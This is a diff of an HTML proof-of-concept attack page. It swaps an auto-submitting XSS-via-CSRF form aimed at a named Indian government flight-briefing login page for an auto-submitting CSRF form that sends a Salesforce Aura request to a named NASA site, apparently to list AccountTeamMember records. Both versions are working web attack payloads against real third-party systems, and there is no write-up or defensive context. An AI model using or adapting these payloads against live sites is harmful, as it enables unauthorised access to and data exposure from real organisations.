@@ -6,19 +6,18 @@
 </head>
 
 <body>
-    <h3>XSS via CSRF PoC by t0m1irv4n</h3>
-    <button id="exploitBtn">Klik untuk Eksploitasi</button>
-    <div id="status"></div>
-
-    <form action="https://olbs.amssdelhi.gov.in/nsweb/FlightBriefing/showlogin.php" method="POST">
-        <input type="hidden" name="errmsg" value="<script>alert(1)</script>">
-        <input type="submit">
-        <script>
-            history.pushState('', '', '/');
-              document.forms[0].submit();
-        </script>
-
-    </form>
-</body>
+      <h3>Standard CSRF PoC</h3>
+      <form action="https://stemgateway.nasa.gov/public/s/sfsites/aura?r=6&ui-comm-runtime-components-aura-components-siteforce-qb.Quarterback.getAllowedPostMessageOrigins=1" method="post">
+      <input type="hidden" name="message" value="{&quot;actions&quot;:[{&quot;id&quot;:&quot;80;a&quot;,&quot;descriptor&quot;:&quot;serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems&quot;,&quot;callingDescriptor&quot;:&quot;UNKNOWN&quot;,&quot;params&quot;:{&quot;entityNameOrId&quot;:&quot;AccountTeamMember&quot;,&quot;layoutType&quot;:&quot;FULL&quot;,&quot;pageSize&quot;:100,&quot;currentPage&quot;:0,&quot;useTimeout&quot;:false,&quot;getCount&quot;:false,&quot;enableRowActions&quot;:false}}]}" />
+    <input type="hidden" name="aura.context" value="{&quot;mode&quot;:&quot;PROD&quot;,&quot;fwuid&quot;:&quot;REdtNUF5ejJUNWxpdVllUjQtUzV4UTFLcUUxeUY3ZVB6dE9hR0VheDVpb2cxMy4zMzU1NDQzMi41MDMzMTY0OA&quot;,&quot;app&quot;:&quot;siteforce:loginApp2&quot;,&quot;loaded&quot;:{&quot;APPLICATION@markup://siteforce:loginApp2&quot;:&quot;1343_FXfywJTDy_Pq6QSlM3hWkA&quot;},&quot;dn&quot;:[],&quot;globals&quot;:{},&quot;uad&quot;:false}" />
+    <input type="hidden" name="aura.pageURI" value="/public/s/login/" />
+    <input type="hidden" name="aura.token" value="null" />
+          <input type="submit" value="Submit request" />
+      </form>
+      <script>
+          history.pushState('', '', '/');
+          document.forms[0].submit();
+      </script>
+  </body>
 
 </html>
